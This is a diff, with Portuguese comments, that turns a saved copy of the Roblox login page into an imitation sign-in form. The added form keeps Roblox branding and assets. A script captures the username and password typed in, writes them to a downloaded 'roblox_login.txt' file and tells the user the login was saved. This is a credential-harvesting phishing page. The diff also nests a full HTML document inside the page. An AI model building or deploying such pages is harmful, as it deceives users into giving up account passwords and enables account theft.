@@ -473,7 +473,7 @@ src="https://js.rbxcdn.com/c0b9b674b2a87f0aa6358830e63fa62841ce9a3e24f065c5fd33b
     </div>
     <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
       <li>
-        <a class="font-header-2 nav-menu-title text-header" href="/charts">Destaques</a>
+        <a class="font-header-2 nav-menu-title text-header" href="dest.html">Destaques</a>
       </li>
       <li>
         <a class="font-header-2 nav-menu-title text-header" href="sla0.html">Mercado</a>
@@ -488,7 +488,7 @@ src="https://js.rbxcdn.com/c0b9b674b2a87f0aa6358830e63fa62841ce9a3e24f065c5fd33b
 
     <ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12">
       <li>
-        <a class="font-header-2 nav-menu-title text-header" href="/charts">Destaques</a>
+        <a class="font-header-2 nav-menu-title text-header" href="dest.html">Destaques</a>
       </li>
       <li>
         <a class="font-header-2 nav-menu-title text-header" href="sla0.html">Mercado</a>
@@ -555,7 +555,167 @@ site.</div></div></noscript>
 
         <div class="content" id="content">
 
-<div id="react-login-web-app"></div>
+<!DOCTYPE html>
+<!--[if IE 8]><html class="ie8" ng-app="robloxApp"><![endif]-->
+<!--[if gt IE 8]><!-->
+<html lang="pt">
+<!--<![endif]-->
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="author" content="Roblox Corporation" />
+    <meta name="description" content="Entre na sua conta Roblox ou inscreva-se para criar uma nova conta." />
+    <meta name="keywords" content="jogos grátis, jogos online, jogos de construção, mundos virtuais, mmo grátis, nuvem de jogos, motor de física" />
+
+    <title>Entrar na Roblox</title>
+
+    <!-- Todos os CSS originais do Roblox -->
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)"
+          data-bundlename="FoundationCss" data-bundle-source="Main"
+          href="https://css.rbxcdn.com/a37a0c2f7ace666c225ad7750883753e3eab0c4b586f5dc89853f85071230e00.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)"
+          data-bundlename="StyleGuide" data-bundle-source="Main"
+          href="https://css.rbxcdn.com/944c0c29b874f40bc983ce7754218170b4265e625e7351b1c6880694adb81556.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)"
+          data-bundlename="ReactLogin" data-bundle-source="Main"
+          href="https://css.rbxcdn.com/d47b8eefce509dac9b478c8602d901170bbeedd3dad170867869f3cad3f49f15.css" />
+
+    <!-- Estilo adicional para mensagem de status -->
+    <style>
+        #loginStatus {
+            color: #00a2ff;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+            height: 20px;
+        }
+    </style>
+</head>
+<body id="rbx-body" dir="ltr" class="rbx-body dark-theme builder-font">
+    <!-- Estrutura original completa do Roblox -->
+    <div id="wrap" class="wrap no-gutter-ads logged-out">
+        <div id="navigation-container" class="builder-font ixp-marketplace-rename-control charts-rename-exp-treatment">
+            <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
+                <div class="container-fluid">
+                    <div class="rbx-navbar-header">
+                        <div id="header-menu-icon" class="rbx-nav-collapse">
+                            <button type="button" class="btn-navigation-nav-menu-md menu-button">
+                                <span class="icon-nav-menu"></span>
+                            </button>
+                        </div>
+                        <div class="navbar-header">
+                            <a class="navbar-brand" href="/home">
+                                <span class="icon-logo"></span><span class="icon-logo-r"></span>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Área principal de conteúdo - ÚNICA PARTE MODIFICADA -->
+        <main class="container-main content-no-ads" id="container-main" tabindex="-1">
+            <div class="content" id="content">
+                <div id="react-login-web-app">
+                    <!-- Container do formulário de login -->
+                    <div class="login-content" style="max-width: 350px; margin: 0 auto; padding: 24px; background: white; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
+                        <!-- Logo do Roblox -->
+                        <div style="text-align: center; margin-bottom: 20px;">
+                            <span class="icon-logo"></span><span class="icon-logo-r"></span>
+                        </div>
+                        
+                        <!-- Título -->
+                        <h1 style="font-size: 24px; text-align: center; margin-bottom: 24px; color: #000;">Entrar na Conta</h1>
+                        
+                        <!-- Formulário de login -->
+                        <form id="loginForm">
+                            <!-- Campo de usuário -->
+                            <div style="margin-bottom: 16px;">
+                                <label style="display: block; margin-bottom: 6px; font-weight: bold; font-size: 14px;">Usuário/E-mail</label>
+                                <input type="text" id="username" required style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px;">
+                            </div>
+                            
+                            <!-- Campo de senha -->
+                            <div style="margin-bottom: 16px;">
+                                <label style="display: block; margin-bottom: 6px; font-weight: bold; font-size: 14px;">Senha</label>
+                                <input type="password" id="password" required style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px;">
+                            </div>
+                            
+                            <!-- Botão de entrar -->
+                            <button type="button" id="loginButton" style="background-color: #00a2ff; color: white; border: none; padding: 12px; border-radius: 4px; width: 100%; cursor: pointer; font-size: 16px; font-weight: 500;">Entrar</button>
+                            
+                            <!-- Mensagem de status -->
+                            <div id="loginStatus"></div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- Rodapé original do Roblox -->
+        <footer class="container-footer" id="footer-container" data-is-giftcards-footer-enabled="True"></footer>
+    </div>
+
+    <!-- Script para salvar em TXT - ÚNICA OUTRA MODIFICAÇÃO -->
+    <script>
+        document.getElementById('loginButton').addEventListener('click', function() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const statusElement = document.getElementById('loginStatus');
+            
+            // Validação dos campos
+            if (!username || !password) {
+                statusElement.textContent = "Por favor, preencha todos os campos!";
+                return;
+            }
+            
+            // Formatar os dados para salvar
+            const loginData = `Dados de Login Roblox:\n\nUsuário: ${username}\nSenha: ${password}\nData: ${new Date().toLocaleString()}\n\n`;
+            
+            // Criar elemento para download
+            const blob = new Blob([loginData], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'roblox_login.txt';
+            
+            // Disparar o download
+            document.body.appendChild(a);
+            a.click();
+            
+            // Limpar
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            // Feedback para o usuário
+            statusElement.textContent = "Login salvo com sucesso!";
+            
+            // Limpar formulário após 2 segundos
+            setTimeout(() => {
+                document.getElementById('loginForm').reset();
+                statusElement.textContent = "";
+            }, 2000);
+        });
+    </script>
+
+    <!-- TODOS OS SCRIPTS ORIGINAIS DO ROBLOX (mantidos exatamente como estão) -->
+    <script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)"
+            data-monitor="true" data-bundlename="EnvironmentUrls" data-bundle-source="Main"
+            src="https://js.rbxcdn.com/fc5032e013a877ae8dfdaf16e906375fc2d37781f22ca2908ee39b163d5e6269.js"></script>
+    <script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true'
+            data-bundlename='headerinit' type='text/javascript'
+            src='https://js.rbxcdn.com/6f8bcfd33c17e884e38a8dcb89b5da42.js'></script>
+    <script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)"
+            data-monitor="true" data-bundlename="Polyfill" data-bundle-source="Main"
+            src="https://js.rbxcdn.com/5c8a2ba3737908f693394045e81ebd71c77cde6f87550ea51f7833e8c98200ae.js"></script>
+    <script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)"
+            data-monitor="true" data-bundlename="XsrfProtection" data-bundle-source="Main"
+            src="https://js.rbxcdn.com/2f0fd0c2760ff1898187af6df3b764f4b08f77a315d0a33654f105f61b0ea6d0.js"></script>
+    <script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)"
+            data-monitor="true" data-bundlename="HeaderScripts" data-bundle-source="Main"
+            src="https://js.rbxcdn.com/dd0d34c6d7afd472e5636ca7645e703dd18502fc01c8211279879f64c847dee4.js"></script>
+    <!-- ... (todos os outros scripts originais) ... --></html>
 
         </div>
     </main><!--Bootstrap Footer React Component -->
